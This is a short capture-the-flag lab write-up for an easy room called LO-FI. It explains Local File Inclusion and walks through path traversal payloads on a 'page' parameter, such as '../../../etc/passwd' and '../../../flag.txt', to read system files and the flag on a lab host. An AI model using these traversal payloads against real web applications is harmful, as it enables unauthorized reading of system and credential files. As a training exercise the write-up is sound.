**Room:** LO-FI
**Level:** Easy

**ABOUT:**
This room focuses on a **Local File Inclusion (LFI)** vulnerability. LFI occurs when a web application does not properly validate user input and allows an attacker to include or read files from the local file system by manipulating a vulnerable parameter.

<img width="1920" height="1080" alt="Screenshot at 2026-01-01 03-07-18" src="https://github.com/user-attachments/assets/df9e2d94-5c00-46db-b022-79f6168cb2be" />

this room also gives us hint of this room is vulnerable to local file inclusiton attack
here a site has peramter page which take a value like sleep.php,relex.php
http://10.80.190.8/?page=relax.php
http://10.80.190.8/?page=sleep.php
change this peramter with some known path like 

http://10.80.190.8/?page=/etc/passwd
<img width="1920" height="1080" alt="Screenshot at 2026-01-01 03-18-43" src="https://github.com/user-attachments/assets/3ddf5f78-538e-4e9e-9c78-01bb76f3e4b3" />
http://10.80.190.8/?page=../etc/passwd

http://10.80.190.8/?page=../../etc/passwd
<img width="1920" height="1080" alt="Screenshot at 2026-01-01 03-18-43" src="https://github.com/user-attachments/assets/5ecc0144-2fea-47a1-b343-0c04b8900072" />

http://10.80.190.8/?page=../../../etc/passwd 
<img width="1920" height="1080" alt="Screenshot at 2026-01-01 03-19-10" src="https://github.com/user-attachments/assets/85abce8e-97b9-4242-a6f9-8afc86431871" />

now we know ../../../etc/passwd is work so we need to find a flag which may be on a root directory and it's name is something like root.txt,flag.txt i try both and i found flag.txt
http://10.80.190.8/?page=../../../flag.txt
<img width="1920" height="1080" alt="Screenshot at 2026-01-01 03-19-46" src="https://github.com/user-attachments/assets/c3edcc30-866a-4a42-aceb-5bf634c87f6e" />









